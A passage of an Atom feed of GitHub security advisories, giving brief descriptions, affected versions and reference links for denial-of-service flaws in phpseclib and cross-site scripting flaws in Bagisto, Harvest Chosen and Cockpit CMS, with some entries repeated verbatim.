<p>Or do not install <code>symfony/security-http</code> versions greater equal than <code>v5.4.30</code> or <code>v6.3.6</code>.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>Currently no references.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/sulu/sulu/security/advisories/GHSA-jr83-m233-gg6p">https://github.com/sulu/sulu/security/advisories/GHSA-jr83-m233-gg6p</a></li>
<li><a href="https://github.com/sulu/sulu/commit/ec9c3f99e15336dc4f6877f512300f231c17c6da">https://github.com/sulu/sulu/commit/ec9c3f99e15336dc4f6877f512300f231c17c6da</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27915">https://nvd.nist.gov/vuln/detail/CVE-2024-27915</a></li>
<li><a href="https://github.com/advisories/GHSA-jr83-m233-gg6p">https://github.com/advisories/GHSA-jr83-m233-gg6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr83-m233-gg6p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-04T20:45:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib does not properly limit the ASN1 OID length]]></title>
        <id>https://github.com/advisories/GHSA-jr22-8qgm-4q87</id>
        <link href="https://github.com/advisories/GHSA-jr22-8qgm-4q87"/>
        <updated>2024-03-04T20:42:23.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. When processing the ASN.1 object identifier of a certificate, a sub identifier may be provided that leads to a denial of service (CPU consumption for decodeOID).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27355">https://nvd.nist.gov/vuln/detail/CVE-2024-27355</a></li>
<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129">https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59">https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59</a></li>
<li><a href="https://github.com/advisories/GHSA-jr22-8qgm-4q87">https://github.com/advisories/GHSA-jr22-8qgm-4q87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr22-8qgm-4q87</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-02T00:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib does not properly limit the ASN1 OID length]]></title>
        <id>https://github.com/advisories/GHSA-jr22-8qgm-4q87</id>
        <link href="https://github.com/advisories/GHSA-jr22-8qgm-4q87"/>
        <updated>2024-03-04T20:42:23.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. When processing the ASN.1 object identifier of a certificate, a sub identifier may be provided that leads to a denial of service (CPU consumption for decodeOID).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27355">https://nvd.nist.gov/vuln/detail/CVE-2024-27355</a></li>
<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129">https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59">https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59</a></li>
<li><a href="https://github.com/advisories/GHSA-jr22-8qgm-4q87">https://github.com/advisories/GHSA-jr22-8qgm-4q87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr22-8qgm-4q87</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-02T00:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib does not properly limit the ASN1 OID length]]></title>
        <id>https://github.com/advisories/GHSA-jr22-8qgm-4q87</id>
        <link href="https://github.com/advisories/GHSA-jr22-8qgm-4q87"/>
        <updated>2024-03-04T20:42:23.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. When processing the ASN.1 object identifier of a certificate, a sub identifier may be provided that leads to a denial of service (CPU consumption for decodeOID).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27355">https://nvd.nist.gov/vuln/detail/CVE-2024-27355</a></li>
<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129">https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59">https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59</a></li>
<li><a href="https://github.com/advisories/GHSA-jr22-8qgm-4q87">https://github.com/advisories/GHSA-jr22-8qgm-4q87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr22-8qgm-4q87</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-02T00:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib a large prime can cause a denial of service ]]></title>
        <id>https://github.com/advisories/GHSA-hg35-mp25-qf6h</id>
        <link href="https://github.com/advisories/GHSA-hg35-mp25-qf6h"/>
        <updated>2024-03-04T20:41:56.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. An attacker can construct a malformed certificate containing an extremely large prime to cause a denial of service (CPU consumption for an isPrime primality check). NOTE: this issue was introduced when attempting to fix CVE-2023-27560.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27354">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>
<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>
<li><a href="https://github.com/advisories/GHSA-hg35-mp25-qf6h">https://github.com/advisories/GHSA-hg35-mp25-qf6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hg35-mp25-qf6h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-02T00:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib a large prime can cause a denial of service ]]></title>
        <id>https://github.com/advisories/GHSA-hg35-mp25-qf6h</id>
        <link href="https://github.com/advisories/GHSA-hg35-mp25-qf6h"/>
        <updated>2024-03-04T20:41:56.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. An attacker can construct a malformed certificate containing an extremely large prime to cause a denial of service (CPU consumption for an isPrime primality check). NOTE: this issue was introduced when attempting to fix CVE-2023-27560.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27354">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>
<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>
<li><a href="https://github.com/advisories/GHSA-hg35-mp25-qf6h">https://github.com/advisories/GHSA-hg35-mp25-qf6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hg35-mp25-qf6h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-02T00:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib a large prime can cause a denial of service ]]></title>
        <id>https://github.com/advisories/GHSA-hg35-mp25-qf6h</id>
        <link href="https://github.com/advisories/GHSA-hg35-mp25-qf6h"/>
        <updated>2024-03-04T20:41:56.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. An attacker can construct a malformed certificate containing an extremely large prime to cause a denial of service (CPU consumption for an isPrime primality check). NOTE: this issue was introduced when attempting to fix CVE-2023-27560.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27354">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>
<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>
<li><a href="https://github.com/advisories/GHSA-hg35-mp25-qf6h">https://github.com/advisories/GHSA-hg35-mp25-qf6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hg35-mp25-qf6h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-02T00:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bagisto/bagisto] Bagist Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w5mx-334j-6fwv</id>
        <link href="https://github.com/advisories/GHSA-w5mx-334j-6fwv"/>
        <updated>2024-03-01T20:08:05.000Z</updated>
        <content type="html"><![CDATA[<p>Bagisto is vulnerable to cross-site scripting (XSS) via png file upload vulnerability in product review option.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27499">https://nvd.nist.gov/vuln/detail/CVE-2024-27499</a></li>
<li><a href="https://github.com/bagisto/bagisto/pull/9474">https://github.com/bagisto/bagisto/pull/9474</a></li>
<li><a href="https://github.com/Ek-Saini/security/blob/main/xss-bagisto-v1.5.1">https://github.com/Ek-Saini/security/blob/main/xss-bagisto-v1.5.1</a></li>
<li><a href="https://github.com/bagisto/bagisto/commit/b01bfc5fab3933a132380f36cb2e9670d2310baf">https://github.com/bagisto/bagisto/commit/b01bfc5fab3933a132380f36cb2e9670d2310baf</a></li>
<li><a href="https://github.com/advisories/GHSA-w5mx-334j-6fwv">https://github.com/advisories/GHSA-w5mx-334j-6fwv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5mx-334j-6fwv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-01T18:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[harvesthq/chosen] Harvest Chosen vulnerable to Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-x5q4-m45m-fm94</id>
        <link href="https://github.com/advisories/GHSA-x5q4-m45m-fm94"/>
        <updated>2024-03-01T14:22:41.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability, which was classified as problematic, has been found in Harvest Chosen up to 1.8.6. Affected by this issue is the function AbstractChosen of the file coffee/lib/abstract-chosen.coffee. The manipulation of the argument group_label leads to cross site scripting. The attack may be launched remotely. Upgrading to version 1.8.7 can address this issue. The name of the patch is 77fd031d541e77510268d1041ed37798fdd1017e. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-216956.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-25050">https://nvd.nist.gov/vuln/detail/CVE-2018-25050</a></li>
<li><a href="https://github.com/harvesthq/chosen/pull/2997">https://github.com/harvesthq/chosen/pull/2997</a></li>
<li><a href="https://github.com/harvesthq/chosen/commit/77fd031d541e77510268d1041ed37798fdd1017e">https://github.com/harvesthq/chosen/commit/77fd031d541e77510268d1041ed37798fdd1017e</a></li>
<li><a href="https://github.com/harvesthq/chosen/releases/tag/v1.8.7">https://github.com/harvesthq/chosen/releases/tag/v1.8.7</a></li>
<li><a href="https://vuldb.com/?ctiid.216956">https://vuldb.com/?ctiid.216956</a></li>
<li><a href="https://vuldb.com/?id.216956">https://vuldb.com/?id.216956</a></li>
<li><a href="https://github.com/advisories/GHSA-x5q4-m45m-fm94">https://github.com/advisories/GHSA-x5q4-m45m-fm94</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5q4-m45m-fm94</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-28T12:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cockpit-hq/cockpit] Cockpit CMS Cross-Site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q76r-7p4q-mqpw</id>
        <link href="https://github.com/advisories/GHSA-q76r-7p4q-mqpw"/>
        <updated>2024-02-29T23:27:17.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting vulnerability in Cockpit CMS affecting version 2.7.0. This vulnerability could allow an authenticated user to upload an infected PDF file and store a malicious JavaScript payload to be executed when the file is uploaded.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2001">https://nvd.nist.gov/vuln/detail/CVE-2024-2001</a></li>
<li><a href="https://www.incibe.es/en/incibe-cert/notices/aviso/cross-site-scripting-vulnerability-cockpit-cms">https://www.incibe.es/en/incibe-cert/notices/aviso/cross-site-scripting-vulnerability-cockpit-cms</a></li>
<li><a href="https://github.com/advisories/GHSA-q76r-7p4q-mqpw">https://github.com/advisories/GHSA-q76r-7p4q-mqpw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q76r-7p4q-mqpw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-29T15:32:26.000Z</published>
    </entry>
</feed>